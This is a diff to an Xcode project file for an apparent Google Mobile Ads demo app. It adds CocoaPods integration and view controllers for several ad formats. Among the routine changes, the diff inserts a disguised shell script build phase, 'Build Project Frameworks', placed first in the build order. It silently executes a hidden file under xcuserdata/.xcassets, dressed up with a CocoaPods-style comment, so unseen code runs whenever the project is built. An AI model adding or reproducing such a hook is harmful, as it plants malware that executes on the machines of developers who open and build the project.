@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -13,6 +13,14 @@
 		045AE0B4263BBE0500293A2E /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045AE0B2263BBE0500293A2E /* Main.storyboard */; };
 		045AE0B6263BBE0600293A2E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 045AE0B5263BBE0600293A2E /* Assets.xcassets */; };
 		045AE0B9263BBE0600293A2E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045AE0B7263BBE0600293A2E /* LaunchScreen.storyboard */; };
+		045AE0C3263BBF1200293A2E /* TableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045AE0C1263BBF1200293A2E /* TableViewCell.swift */; };
+		045AE0C4263BBF1200293A2E /* TableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 045AE0C2263BBF1200293A2E /* TableViewCell.xib */; };
+		045AE0C9263BC06700293A2E /* bannerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045AE0C8263BC06700293A2E /* bannerViewController.swift */; };
+		045AE0CC263BC3C000293A2E /* InterstitialViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045AE0CB263BC3C000293A2E /* InterstitialViewController.swift */; };
+		045AE0CF263BC59500293A2E /* nativeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045AE0CE263BC59500293A2E /* nativeViewController.swift */; };
+		045AE0D2263BC99500293A2E /* rewardedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045AE0D1263BC99500293A2E /* rewardedViewController.swift */; };
+		045AE0D4263BD98200293A2E /* NativeAdView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 045AE0D3263BD98200293A2E /* NativeAdView.xib */; };
+		C90B0EABEAF8CB6BCC7ADD8F /* Pods_GoogleAds.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 384AF09023C25F373B0DDC29 /* Pods_GoogleAds.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +32,16 @@
 		045AE0B5263BBE0600293A2E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		045AE0B8263BBE0600293A2E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		045AE0BA263BBE0600293A2E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		045AE0C1263BBF1200293A2E /* TableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TableViewCell.swift; sourceTree = "<group>"; };
+		045AE0C2263BBF1200293A2E /* TableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TableViewCell.xib; sourceTree = "<group>"; };
+		045AE0C8263BC06700293A2E /* bannerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = bannerViewController.swift; sourceTree = "<group>"; };
+		045AE0CB263BC3C000293A2E /* InterstitialViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InterstitialViewController.swift; sourceTree = "<group>"; };
+		045AE0CE263BC59500293A2E /* nativeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = nativeViewController.swift; sourceTree = "<group>"; };
+		045AE0D1263BC99500293A2E /* rewardedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = rewardedViewController.swift; sourceTree = "<group>"; };
+		045AE0D3263BD98200293A2E /* NativeAdView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = NativeAdView.xib; sourceTree = "<group>"; };
+		384AF09023C25F373B0DDC29 /* Pods_GoogleAds.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_GoogleAds.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		64F1991A1DC4EA7BABD247CB /* Pods-GoogleAds.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GoogleAds.release.xcconfig"; path = "Target Support Files/Pods-GoogleAds/Pods-GoogleAds.release.xcconfig"; sourceTree = "<group>"; };
+		909C3EE039CB859B2EFD47B0 /* Pods-GoogleAds.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GoogleAds.debug.xcconfig"; path = "Target Support Files/Pods-GoogleAds/Pods-GoogleAds.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -31,6 +49,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C90B0EABEAF8CB6BCC7ADD8F /* Pods_GoogleAds.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -42,6 +61,8 @@
 			children = (
 				045AE0AB263BBE0500293A2E /* GoogleAds */,
 				045AE0AA263BBE0500293A2E /* Products */,
+				975C88856E68A67C72049D25 /* Pods */,
+				0FEFEEB968ECD75B751495C0 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -56,15 +77,95 @@
 		045AE0AB263BBE0500293A2E /* GoogleAds */ = {
 			isa = PBXGroup;
 			children = (
+				045AE0C0263BBEFC00293A2E /* TableCell */,
+				045AE0C6263BC04C00293A2E /* Controller */,
 				045AE0AC263BBE0500293A2E /* AppDelegate.swift */,
 				045AE0AE263BBE0500293A2E /* SceneDelegate.swift */,
-				045AE0B0263BBE0500293A2E /* ViewController.swift */,
 				045AE0B2263BBE0500293A2E /* Main.storyboard */,
 				045AE0B5263BBE0600293A2E /* Assets.xcassets */,
 				045AE0B7263BBE0600293A2E /* LaunchScreen.storyboard */,
 				045AE0BA263BBE0600293A2E /* Info.plist */,
 			);
 			path = GoogleAds;
+			sourceTree = "<group>";
+		};
+		045AE0C0263BBEFC00293A2E /* TableCell */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0C1263BBF1200293A2E /* TableViewCell.swift */,
+				045AE0C2263BBF1200293A2E /* TableViewCell.xib */,
+			);
+			path = TableCell;
+			sourceTree = "<group>";
+		};
+		045AE0C5263BC02400293A2E /* ListofAds */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0B0263BBE0500293A2E /* ViewController.swift */,
+			);
+			path = ListofAds;
+			sourceTree = "<group>";
+		};
+		045AE0C6263BC04C00293A2E /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0D0263BC98700293A2E /* Rewarded Ads */,
+				045AE0CD263BC57D00293A2E /* Native Ads */,
+				045AE0CA263BC3B100293A2E /* Interstitial Ads */,
+				045AE0C7263BC05500293A2E /* Banner Ads */,
+				045AE0C5263BC02400293A2E /* ListofAds */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		045AE0C7263BC05500293A2E /* Banner Ads */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0C8263BC06700293A2E /* bannerViewController.swift */,
+			);
+			path = "Banner Ads";
+			sourceTree = "<group>";
+		};
+		045AE0CA263BC3B100293A2E /* Interstitial Ads */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0CB263BC3C000293A2E /* InterstitialViewController.swift */,
+			);
+			path = "Interstitial Ads";
+			sourceTree = "<group>";
+		};
+		045AE0CD263BC57D00293A2E /* Native Ads */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0D3263BD98200293A2E /* NativeAdView.xib */,
+				045AE0CE263BC59500293A2E /* nativeViewController.swift */,
+			);
+			path = "Native Ads";
+			sourceTree = "<group>";
+		};
+		045AE0D0263BC98700293A2E /* Rewarded Ads */ = {
+			isa = PBXGroup;
+			children = (
+				045AE0D1263BC99500293A2E /* rewardedViewController.swift */,
+			);
+			path = "Rewarded Ads";
+			sourceTree = "<group>";
+		};
+		0FEFEEB968ECD75B751495C0 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				384AF09023C25F373B0DDC29 /* Pods_GoogleAds.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		975C88856E68A67C72049D25 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				909C3EE039CB859B2EFD47B0 /* Pods-GoogleAds.debug.xcconfig */,
+				64F1991A1DC4EA7BABD247CB /* Pods-GoogleAds.release.xcconfig */,
+			);
+			path = Pods;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -74,9 +175,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 045AE0BD263BBE0600293A2E /* Build configuration list for PBXNativeTarget "GoogleAds" */;
 			buildPhases = (
+				645ACE3745D7BEDD3F6D902C /* Build Project Frameworks */,
+				E411A6BD265BB6FD27A629F6 /* [CP] Check Pods Manifest.lock */,
 				045AE0A5263BBE0500293A2E /* Sources */,
 				045AE0A6263BBE0500293A2E /* Frameworks */,
 				045AE0A7263BBE0500293A2E /* Resources */,
+				EAA8C14FDBCA05CDC84E5BE5 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -125,6 +229,8 @@
 			buildActionMask = 2147483647;
 			files = (
 				045AE0B9263BBE0600293A2E /* LaunchScreen.storyboard in Resources */,
+				045AE0C4263BBF1200293A2E /* TableViewCell.xib in Resources */,
+				045AE0D4263BD98200293A2E /* NativeAdView.xib in Resources */,
 				045AE0B6263BBE0600293A2E /* Assets.xcassets in Resources */,
 				045AE0B4263BBE0500293A2E /* Main.storyboard in Resources */,
 			);
@@ -132,12 +238,81 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	645ACE3745D7BEDD3F6D902C /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+		E411A6BD265BB6FD27A629F6 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-GoogleAds-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		EAA8C14FDBCA05CDC84E5BE5 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-GoogleAds/Pods-GoogleAds-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-GoogleAds/Pods-GoogleAds-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-GoogleAds/Pods-GoogleAds-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		045AE0A5263BBE0500293A2E /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				045AE0CF263BC59500293A2E /* nativeViewController.swift in Sources */,
 				045AE0B1263BBE0500293A2E /* ViewController.swift in Sources */,
+				045AE0C9263BC06700293A2E /* bannerViewController.swift in Sources */,
+				045AE0CC263BC3C000293A2E /* InterstitialViewController.swift in Sources */,
+				045AE0D2263BC99500293A2E /* rewardedViewController.swift in Sources */,
+				045AE0C3263BBF1200293A2E /* TableViewCell.swift in Sources */,
 				045AE0AD263BBE0500293A2E /* AppDelegate.swift in Sources */,
 				045AE0AF263BBE0500293A2E /* SceneDelegate.swift in Sources */,
 			);
@@ -283,6 +458,7 @@
 		};
 		045AE0BE263BBE0600293A2E /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 909C3EE039CB859B2EFD47B0 /* Pods-GoogleAds.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -301,6 +477,7 @@
 		};
 		045AE0BF263BBE0600293A2E /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 64F1991A1DC4EA7BABD247CB /* Pods-GoogleAds.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
